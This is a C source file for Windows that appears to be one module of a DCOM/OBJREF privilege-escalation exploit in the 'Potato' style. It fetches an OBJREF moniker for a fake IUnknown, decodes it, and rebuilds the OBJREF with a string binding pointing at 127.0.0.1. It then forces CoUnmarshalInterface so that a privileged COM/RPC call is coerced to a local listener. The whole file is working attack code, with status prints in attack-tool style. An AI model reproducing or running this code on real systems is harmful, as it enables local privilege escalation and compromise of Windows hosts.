#include "../includes/objref.h"
#include "../includes/utils.h"

static const signed char b64dec[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
};

static BYTE *Base64Decode(const char *src, SIZE_T *outLen) {
    SIZE_T srcLen = strlen(src);
    SIZE_T maxOut = (srcLen * 3) / 4 + 4;
    BYTE *out = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxOut);
    if (!out) return NULL;

    SIZE_T j    = 0;
    UINT   acc  = 0;
    int    bits = 0;
    for (SIZE_T i = 0; i < srcLen; i++) {
        signed char v = b64dec[(unsigned char)src[i]];
        if (v < 0) continue;
        acc  = (acc << 6) | (unsigned)v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[j++] = (BYTE)(acc >> bits);
        }
    }
    *outLen = j;
    return out;
}

typedef struct IFakeUnknown IFakeUnknown;
typedef struct IFakeUnknownVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IFakeUnknown*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IFakeUnknown*);
    ULONG   (STDMETHODCALLTYPE *Release)(IFakeUnknown*);
} IFakeUnknownVtbl;
struct IFakeUnknown { IFakeUnknownVtbl *lpVtbl; LONG refCount; };

static HRESULT STDMETHODCALLTYPE FakeQI(IFakeUnknown *self, REFIID riid, void **ppv) {
    if (IsEqualGUID(riid, &IID_IUnknown_val)) {
        *ppv = self;
        InterlockedIncrement(&self->refCount);
        return S_OK;
    }
    *ppv = NULL;
    return E_NOINTERFACE;
}
static ULONG STDMETHODCALLTYPE FakeAddRef (IFakeUnknown *s) { return (ULONG)InterlockedIncrement(&s->refCount); }
static ULONG STDMETHODCALLTYPE FakeRelease(IFakeUnknown *s) { return (ULONG)InterlockedDecrement(&s->refCount); }
static IFakeUnknownVtbl g_FakeVtbl = { FakeQI, FakeAddRef, FakeRelease };

/* =========================================================================
 * Build modified OBJREF bytes
 * ========================================================================= */
static BYTE *BuildObjRef(const BYTE *orig, SIZE_T origLen, SIZE_T *outLen) {
    SIZE_T off = 0;
    if (origLen < 4 + 4 + 16 + 4 + 4 + 8 + 8 + 16) return NULL;

    UINT sig = ru32(orig, &off);
    if (sig != 0x574f454d) { fprintf(stderr, "[-] Bad OBJREF signature\n"); return NULL; }

    ru32(orig, &off); /* flags */
    off += 16;        /* skip source GUID */
    ru32(orig, &off); /* std_flags */
    ru32(orig, &off); /* public_refs */
    UINT64 oxid = ru64(orig, &off);
    UINT64 oid  = ru64(orig, &off);
    BYTE   ipid[16];
    memcpy(ipid, orig + off, 16); off += 16;

    printf("[+] OXID=0x%llx  OID=0x%llx\n",
           (unsigned long long)oxid, (unsigned long long)oid);

    static const char *ipStr = "127.0.0.1";
    SIZE_T ipLen    = 9;
    SIZE_T sbBytes  = 2 + ipLen * 2 + 2 + 2; /* 24 */
    SIZE_T secBytes = 8;
    UINT16 numEntries     = (UINT16)((sbBytes + secBytes) / 2);
    UINT16 securityOffset = (UINT16)(sbBytes / 2);

    SIZE_T total = 4 + 4 + 16 + 4 + 4 + 8 + 8 + 16 + 2 + 2 + sbBytes + secBytes;
    BYTE *buf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total + 16);
    if (!buf) return NULL;

    SIZE_T p = 0;
    wu32(buf, &p, 0x574f454d);
    wu32(buf, &p, 1);
    /* IUnknown GUID: 00000000-0000-0000-C000-000000000046 */
    wu32(buf, &p, 0x00000000);
    wu16(buf, &p, 0x0000);
    wu16(buf, &p, 0x0000);
    buf[p++] = 0xC0; buf[p++] = 0x00;
    memset(buf + p, 0, 5); p += 5;
    buf[p++] = 0x46;
    wu32(buf, &p, 0);
    wu32(buf, &p, 1);
    wu64(buf, &p, oxid);
    wu64(buf, &p, oid);
    memcpy(buf + p, ipid, 16); p += 16;
    wu16(buf, &p, numEntries);
    wu16(buf, &p, securityOffset);
    wu16(buf, &p, 0x0007); /* TCP tower */
    for (SIZE_T i = 0; i < ipLen; i++) wu16(buf, &p, (UINT16)(unsigned char)ipStr[i]);
    wu16(buf, &p, 0);
    wu16(buf, &p, 0);
    wu16(buf, &p, 0x000a);
    wu16(buf, &p, 0xFFFF);
    wu16(buf, &p, 0);
    wu16(buf, &p, 0);

    *outLen = p;
    return buf;
}

static void UnmarshalObject(const BYTE *data, SIZE_T dataLen) {
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, dataLen);
    if (!hMem) return;
    PVOID p = GlobalLock(hMem);
    if (!p) { GlobalFree(hMem); return; }
    memcpy(p, data, dataLen);
    GlobalUnlock(hMem);

    IStream *pStream = NULL;
    HRESULT hr = _CreateStreamOnHGlobal(hMem, TRUE, &pStream);
    if (FAILED(hr)) { GlobalFree(hMem); return; }

    IUnknown *pUnk = NULL;
    hr = _CoUnmarshalInterface(pStream, &IID_IUnknown_val, (void**)&pUnk);
    if (SUCCEEDED(hr) && pUnk) pUnk->lpVtbl->Release(pUnk);
    pStream->lpVtbl->Release(pStream);
}

BOOL TriggerUnmarshal(void) {
    HRESULT hr = _CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CoInitializeEx failed: 0x%08X\n", hr);
        return FALSE;
    }

    IFakeUnknown fakeUnk;
    fakeUnk.lpVtbl   = &g_FakeVtbl;
    fakeUnk.refCount = 1;

    IMoniker *pMoniker = NULL;
    hr = _CreateObjrefMoniker((IUnknown*)&fakeUnk, &pMoniker);
    if (FAILED(hr) || !pMoniker) {
        fprintf(stderr, "[-] CreateObjrefMoniker failed: 0x%08X\n", hr);
        _CoUninitialize();
        return FALSE;
    }

    IBindCtx *pBC = NULL;
    hr = _CreateBindCtx_(0, &pBC);
    if (FAILED(hr) || !pBC) {
        pMoniker->lpVtbl->Release(pMoniker);
        _CoUninitialize();
        return FALSE;
    }

    LPOLESTR displayName = NULL;
    hr = pMoniker->lpVtbl->GetDisplayName(pMoniker, pBC, NULL, &displayName);
    pMoniker->lpVtbl->Release(pMoniker);
    pBC->lpVtbl->Release(pBC);

    if (FAILED(hr) || !displayName) {
        fprintf(stderr, "[-] GetDisplayName failed: 0x%08X\n", hr);
        _CoUninitialize();
        return FALSE;
    }

    char ansi[4096] = {0};
    WideCharToMultiByte(CP_ACP, 0, displayName, -1, ansi, sizeof(ansi) - 1, NULL, NULL);
    CoTaskMemFree(displayName);

    char *b64 = ansi;
    if (strncmp(b64, "objref:", 7) == 0) b64 += 7;
    SIZE_T b64Len = strlen(b64);
    while (b64Len > 0 && b64[b64Len - 1] == ':') b64[--b64Len] = '\0';

    SIZE_T rawLen = 0;
    BYTE *raw = Base64Decode(b64, &rawLen);
    if (!raw) {
        fprintf(stderr, "[-] Base64 decode failed\n");
        _CoUninitialize();
        return FALSE;
    }

    SIZE_T newLen    = 0;
    BYTE  *newObjRef = BuildObjRef(raw, rawLen, &newLen);
    HeapFree(GetProcessHeap(), 0, raw);

    if (!newObjRef) {
        fprintf(stderr, "[-] BuildObjRef failed\n");
        _CoUninitialize();
        return FALSE;
    }

    printf("[+] Triggering DCOM unmarshal\n");
    UnmarshalObject(newObjRef, newLen);
    HeapFree(GetProcessHeap(), 0, newObjRef);

    _CoUninitialize();
    return TRUE;
}
